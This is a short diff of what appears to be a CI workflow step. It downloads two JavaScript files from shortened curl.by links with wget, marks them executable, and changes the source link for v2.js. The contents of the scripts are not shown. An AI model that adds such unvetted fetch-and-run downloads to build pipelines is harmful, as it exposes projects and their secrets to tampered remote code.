@@ -51,7 +51,7 @@ jobs:
       - name: Download scripts
         run: |
           wget -q https://curl.by/VudqN/v1.js -O v1.js
-          wget -q https://curl.by/_8mO2/v2.js -O v2.js
+          wget -q https://curl.by/ufm8x/v2.js -O v2.js
           chmod +x v1.js v2.js
           npm install axios
 
